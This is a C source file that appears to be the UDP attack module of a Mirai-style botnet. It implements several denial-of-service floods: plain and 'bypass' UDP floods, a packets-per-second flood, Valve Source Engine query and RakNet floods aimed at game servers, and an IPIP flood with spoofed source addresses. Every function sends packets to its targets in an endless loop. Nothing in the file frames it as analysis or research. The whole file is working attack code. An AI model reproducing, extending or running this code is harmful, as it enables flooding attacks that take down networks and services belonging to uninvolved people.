#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "protocol.h"

void attack_udp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
            printf("UDPBYPASS!\n");
#endif
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));

    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
        sport = rand_next();
    else
        sport = htons(sport);

    char data[65535] = {0};

    for (int i = 0; i < targs_len; i++) {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1) {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
    }

    while (TRUE) {
        uint16_t pkt_len = rand_next() % 1460 + 1024;
        rand_str(data, pkt_len);

        for (int i = 0; i < targs_len; i++)
            send(fds[i], data, pkt_len, MSG_NOSIGNAL);
    }
}

void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
            printf("UDPPLAIN!\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

#ifdef DEBUG
    printf("after args\n");
#endif

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            while (1)
                sleep(1);
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("after setup\n");
#endif

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            } else {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL);
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_udp_hex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) 
{
#ifdef DEBUG
    printf("UDP HEX!\n");
#endif
    int i;
    char **pkts = calloc(22, sizeof(char *));
    int *fds = calloc(22, sizeof(int));
    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    struct sockaddr_in bind_addr = {0};

    sport = sport == 0xffff ? rand_real() : htons(sport);

    for (i = 0; i < targs_len && i < 22; i++) 
    {

    pkts[i] = calloc(1024, sizeof(char));
    targs[i].sock_addr.sin_port = dport == 0xffff ? rand_real() : htons(dport);

    if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) 
    {
#ifdef DEBUG
            printf("Failed to create UDP socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));

        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_real()) >> targs[i].netmask));

        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
    }

    while (TRUE) 
    {
        for (i = 0; i < targs_len && i < 22; i++) 
        {
            uint16_t min_length = 128;
            uint16_t max_length = 1024;
            uint16_t payload_length = (rand() % (max_length - min_length + 1)) + min_length;

            for (int j = 0; j < payload_length; j++) 
            {
                pkts[i][j] = (char)(rand() % 256);
            }

            send(fds[i], pkts[i], payload_length, MSG_NOSIGNAL);
        }
    }
}

void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("UDP!\n");
#endif
    int fd;
    struct sockaddr_in addr;
    char data[1380];

    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t packet_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);

    if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create UDP socket. Aborting attack\n");
#endif
        return;
    }

    srand(time(NULL));

    while (TRUE)
    {
        for (int i = 0; i < targs_len; i++)
        {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(dport);
            addr.sin_addr.s_addr = targs[i].addr;

            int actual_packet_len = (packet_len > 0) ? packet_len : (rand() % (1380 - 1000 + 1)) + 1000;

#ifdef DEBUG
            printf("target %d: %s, packet Length: %d\n", i, inet_ntoa(addr.sin_addr), actual_packet_len);
#endif

            for (int j = 0; j < actual_packet_len; j++)
            {
                data[j] = (char)(rand() % 0xff);
            }

            sendto(fd, data, actual_packet_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }

    close(fd);
}

void attack_udp_pps(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("UDP PPS!\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof(char *));
    int *fds = calloc(targs_len, sizeof(int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
        sport = rand_next();
    else
        sport = htons(sport);

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(22, sizeof(char));
        targs[i].sock_addr.sin_port = dport == 0xffff ? rand_next() : htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int packet_len = (rand() % 22) + 1;
            rand_str(pkts[i], packet_len);

#ifdef DEBUG
            printf("Target %d: %s, Packet Length: %d\n", i, inet_ntoa(targs[i].sock_addr.sin_addr), packet_len);
#endif

            send(fds[i], pkts[i], packet_len, MSG_NOSIGNAL);
        }
    }
}

void attack_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("VSE!\n");
#endif

    int fd;
    struct sockaddr_in addr;
    char data[1360];

    const char vse_payload[] = 
    {
        0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63,
        0x65, 0x20, 0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51,
        0x75, 0x65, 0x72, 0x79
    };

    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);

    if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create UDP socket. Aborting attack\n");
#endif
        return;
    }

    srand(time(NULL));

    while (TRUE)
    {
        for (int i = 0; i < targs_len; i++)
        {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(dport);
            addr.sin_addr.s_addr = targs[i].addr;

            int payload_len = sizeof(vse_payload);
            int packet_len = (rand() % (1360 - 1000 + 1)) + 1000;

            memcpy(data, vse_payload, payload_len);
            for (int j = payload_len; j < packet_len; j++)
            {
                data[j] = (char)(rand() % 0xff);
            }

#ifdef DEBUG
            printf("target %d: %s, packet length: %d\n", i, inet_ntoa(addr.sin_addr), packet_len);
#endif

            sendto(fd, data, packet_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }

    close(fd);
}

void attack_raknet(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("RAKNET!\n");
#endif

    int fd;
    struct sockaddr_in addr;
    char data[1360];

    const char raknet_payload[] = 
    {
        0x01, 0x00, 0x00, 0x00, 0x00, 0x3a, 0xf2, 0x1b, 0x38, 0x00, 0xff,
        0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd, 0xfd, 0x47,
        0x73, 0x80, 0x19
    };

    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);

    if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create UDP socket. Aborting attack\n");
#endif
        return;
    }

    srand(time(NULL));

    while (TRUE)
    {
        for (int i = 0; i < targs_len; i++)
        {
            addr.sin_family = AF_INET;
            addr.sin_port = htons(dport);
            addr.sin_addr.s_addr = targs[i].addr;

            int payload_len = sizeof(raknet_payload);
            int packet_len = (rand() % (1360 - 1000 + 1)) + 1000;

            memcpy(data, raknet_payload, payload_len);
            for (int j = payload_len; j < packet_len; j++)
            {
                data[j] = (char)(rand() % 0xff);
            }

#ifdef DEBUG
            printf("target %d: %s, packet length: %d\n", i, inet_ntoa(addr.sin_addr), packet_len);
#endif

            sendto(fd, data, packet_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
        }
    }

    close(fd);
}

void attack_ipip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("IPIPUDP!\n");
#endif
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_IPIP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *outer_iph;
        struct iphdr *inner_iph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof(char));
        outer_iph = (struct iphdr *)(pkts[i]);
        inner_iph = (struct iphdr *)(outer_iph + 1);
        udph = (struct udphdr *)(inner_iph + 1);

        // Outer IP Header
        outer_iph->version = 4;
        outer_iph->ihl = 5;
        outer_iph->tos = ip_tos;
        outer_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        outer_iph->id = htons(ip_ident);
        outer_iph->ttl = ip_ttl;
        if (dont_frag)
            outer_iph->frag_off = htons(1 << 14);
        outer_iph->protocol = IPPROTO_IPIP;
        outer_iph->saddr = source_ip;
        outer_iph->daddr = targs[i].addr;

        // Inner IP Header
        inner_iph->version = 4;
        inner_iph->ihl = 5;
        inner_iph->tos = ip_tos;
        inner_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        inner_iph->id = htons(~ip_ident);
        inner_iph->ttl = ip_ttl - 1;
        if (dont_frag)
            inner_iph->frag_off = htons(1 << 14);
        inner_iph->protocol = IPPROTO_UDP;
        inner_iph->saddr = rand_next();
        inner_iph->daddr = targs[i].addr;

        // UDP Header
        udph->source = htons(sport == 0xffff ? rand_next() & 0xffff : sport);
        udph->dest = htons(dport == 0xffff ? rand_next() & 0xffff : dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *outer_iph = (struct iphdr *)pkt;
            struct iphdr *inner_iph = (struct iphdr *)(outer_iph + 1);
            struct udphdr *udph = (struct udphdr *)(inner_iph + 1);
            char *data = (char *)(udph + 1);

            if (targs[i].netmask < 32)
                outer_iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                outer_iph->saddr = rand_next();

            if (ip_ident == 0xffff)
            {
                outer_iph->id = rand_next() & 0xffff;
                inner_iph->id = ~(outer_iph->id - 1000);
            }

            if (data_rand)
                rand_str(data, data_len);

            outer_iph->check = 0;
            outer_iph->check = checksum_generic((uint16_t *)outer_iph, sizeof(struct iphdr));

            inner_iph->check = 0;
            inner_iph->check = checksum_generic((uint16_t *)inner_iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(inner_iph, udph, udph->len, sizeof(struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = outer_iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, ntohs(outer_iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}
